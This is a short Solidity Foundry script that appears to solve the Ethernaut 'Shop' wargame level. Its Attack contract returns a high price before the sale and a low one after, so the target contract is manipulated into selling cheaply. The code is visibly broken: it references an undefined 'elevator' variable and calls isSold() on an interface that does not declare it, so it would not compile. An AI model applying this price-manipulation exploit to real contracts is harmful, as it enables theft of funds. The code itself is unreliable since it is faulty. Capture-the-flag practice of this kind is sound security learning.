// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Shop} from "../../src/Ethernaut/Shop.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Attack attack = new Attack(payable(address(elevator)));
        attack.attack();
        vm.stopBroadcast();
    }
}

interface IShop {
    function buy() external;
}

contract Attack {
    address payable orgContract = payable(0x922a3ccaee23Abb9E5EbdDaF15518557cF7A5a5C);

    function price() public view returns (uint256) {
        if (IShop(orgContract).isSold() == false) {
            return 101;
        } else {
            return 10;
        }
    }

    function attack() public payable {
        IShop(orgContract).buy();
    }
}
